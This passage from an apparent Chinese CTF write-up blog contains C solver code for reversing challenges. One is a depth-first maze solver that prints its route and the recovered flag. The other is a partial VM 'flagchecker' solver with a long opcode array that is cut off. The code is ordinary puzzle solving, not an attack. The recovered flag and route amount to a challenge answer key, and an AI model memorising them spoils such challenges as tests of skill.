class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> xnew=<span class="number">0</span>, ynew=<span class="number">0</span>;</span><br><span class="line">check(x, y);<span class="comment">//判断走到终点。</span></span><br><span class="line">xnew = x - <span class="number">1</span>;</span><br><span class="line">ynew = y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (xnew &gt;= <span class="number">0</span> &amp;&amp; xnew &lt; <span class="number">25</span> &amp;&amp; ynew &gt;= <span class="number">0</span> &amp;&amp; ynew &lt; <span class="number">25</span> &amp;&amp; <span class="built_in">map</span>[xnew][ynew] != <span class="number">1</span> &amp;&amp; mark[xnew][ynew] != <span class="number">1</span>)<span class="comment">//不能越界，不能撞墙，不能走以访问路线。</span></span><br><span class="line">&#123;</span><br><span class="line">way[index++] = <span class="string">&#x27;j&#x27;</span>;<span class="comment">//保存路线，以便输出路线。</span></span><br><span class="line">mark[x][y] = <span class="number">1</span>;<span class="comment">//标记以访问路线，避免重复访问。</span></span><br><span class="line">dfs(xnew, ynew);</span><br><span class="line">mark[x][y] = <span class="number">0</span>;<span class="comment">//如果该路不能到达终点，回溯时要将标记还原。</span></span><br><span class="line">way[--index] = <span class="string">&#x27; &#x27;</span>;<span class="comment">//路线走不通，还原。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xnew = x;</span><br><span class="line">ynew = y + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (xnew &gt;= <span class="number">0</span> &amp;&amp; xnew &lt; <span class="number">25</span> &amp;&amp; ynew &gt;= <span class="number">0</span> &amp;&amp; ynew &lt; <span class="number">25</span>  &amp;&amp; <span class="built_in">map</span>[xnew][ynew] != <span class="number">1</span> &amp;&amp; mark[xnew][ynew] != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">way[index++] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">mark[x][y] = <span class="number">1</span>;</span><br><span class="line">dfs(xnew, ynew);</span><br><span class="line">mark[x][y] = <span class="number">0</span>;</span><br><span class="line">way[--index] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xnew = x + <span class="number">1</span>;</span><br><span class="line">ynew = y;</span><br><span class="line"><span class="keyword">if</span> (xnew &gt;= <span class="number">0</span> &amp;&amp; xnew &lt; <span class="number">25</span> &amp;&amp; ynew &gt;= <span class="number">0</span> &amp;&amp; ynew &lt; <span class="number">25</span> &amp;&amp; <span class="built_in">map</span>[xnew][ynew] != <span class="number">1</span> &amp;&amp; mark[xnew][ynew] != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">way[index++] = <span class="string">&#x27;k&#x27;</span>;</span><br><span class="line">mark[x][y] = <span class="number">1</span>;</span><br><span class="line">dfs(xnew, ynew);</span><br><span class="line">mark[x][y] = <span class="number">0</span>;</span><br><span class="line">way[--index] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xnew = x;</span><br><span class="line">ynew = y - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (xnew &gt;= <span class="number">0</span> &amp;&amp; xnew &lt; <span class="number">25</span> &amp;&amp; ynew &gt;= <span class="number">0</span> &amp;&amp; ynew &lt; <span class="number">25</span>  &amp;&amp; <span class="built_in">map</span>[xnew][ynew] != <span class="number">1</span> &amp;&amp; mark[xnew][ynew] != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">way[index++] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">mark[x][y] = <span class="number">1</span>;</span><br><span class="line">dfs(xnew, ynew);</span><br><span class="line">mark[x][y] = <span class="number">0</span>;</span><br><span class="line">way[--index] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">25</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, <span class="built_in">map</span>[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">dfs(<span class="number">1</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//way: llkkhhhhkkkkhhhhjjhhhhhhkkllkkkkkkhhkkllkklljjlllllljjhhjjllllllkklljjllkklljjllkkkkhhhhkkkkllkkkkhhk</span></span><br><span class="line"><span class="comment">//inctf&#123;mizes_are_fun_or_get&#125; </span></span><br></pre></td></tr></table></figure><h2 id="flagchecker"><a href="#flagchecker" class="headerlink" title="flagchecker"></a>flagchecker</h2><p>做了很久，就是爆破脚本的问题，vm题，逻辑不难，难的是其中的一个函数。</p><p>分析完逻辑后，打印出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//inctf&#123;abcdefghijklmopqrstuvwxyzfsfs&#125;</span></span><br><span class="line"><span class="keyword">int</span> opcode[<span class="number">3840</span>]=&#123;<span class="number">6</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">16</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">24</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">31</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">140</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">25</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">225</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">18</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">26</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">32</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">299</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">10</span>,<span 